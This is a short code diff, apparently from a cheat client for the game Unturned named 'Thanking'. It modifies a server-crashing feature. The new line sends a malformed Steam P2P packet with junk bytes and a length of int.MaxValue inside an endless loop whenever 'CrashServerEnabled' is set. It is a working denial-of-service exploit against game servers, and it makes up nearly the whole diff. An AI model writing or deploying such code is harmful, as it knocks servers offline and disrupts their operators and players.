@@ -1,4 +1,5 @@
 ﻿using SDG.Unturned;
+using Steamworks;
 using Thanking.Attributes;
 using Thanking.Utilities;
 
@@ -19,7 +20,7 @@ namespace Thanking.Threads
 			
 			while (true)
 				if (CrashServerEnabled)
-					Provider.send(Provider.server, ESteamPacket.BATTLEYE, new byte[0], 0, 0);
+					SteamGameServerNetworking.SendP2PPacket(Provider.server, new byte[] {255, 255, 255, 69, 69, 69, 69, 69, 69, 69, 69}, int.MaxValue, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
 		}
 
 		public static void OnDisconnect() =>
